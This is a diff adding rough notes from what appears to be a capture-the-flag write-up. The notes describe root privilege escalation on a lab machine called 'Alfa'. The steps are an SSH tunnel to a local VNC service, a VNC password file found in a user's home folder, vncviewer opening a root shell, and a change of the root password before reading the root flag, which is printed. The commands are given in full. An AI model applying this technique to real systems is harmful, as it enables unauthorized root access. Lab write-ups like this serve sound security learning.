@@ -1,0 +1,36 @@
+to scape our privilages to root with vnc running service ...
+
+
+we need vnc password (which will be in encrypted form on remote host)
+and we ha've to tunnel the vnc service to our host...
+
+
+# ssh  -L 1234:127.0.0.1:5901   thomas@192.168.56.46 -p 65111
+
+since we've user cred we can tunnel with ssh the port 5901 is running vnc...
+
+and then after this we need password of vnc ....
+
+in this case we've alredy .....which was located in user's home
+
+#  .remote_seret i renamed it to(did not mean anything just i did)  >  .remotesecret
+
+then make connection with this...
+
+
+#  vncviewer -passwd .remotesecret localhost:1234 
+
+this will open a prompt with root shell ....in my case i changed the root password with passwd command so that i can swich in ssh connection...
+
+
+thomas@Alfa:~$ su root
+Contraseña: 
+root@Alfa:/home/thomas# whoami
+root
+root@Alfa:/home/thomas# cd ~
+root@Alfa:~# ls
+root.txt  vnc
+root@Alfa:~# cat root.txt 
+
+root_flag==>> QFqy4EUHwtu9rrrVe2T27we5W
+
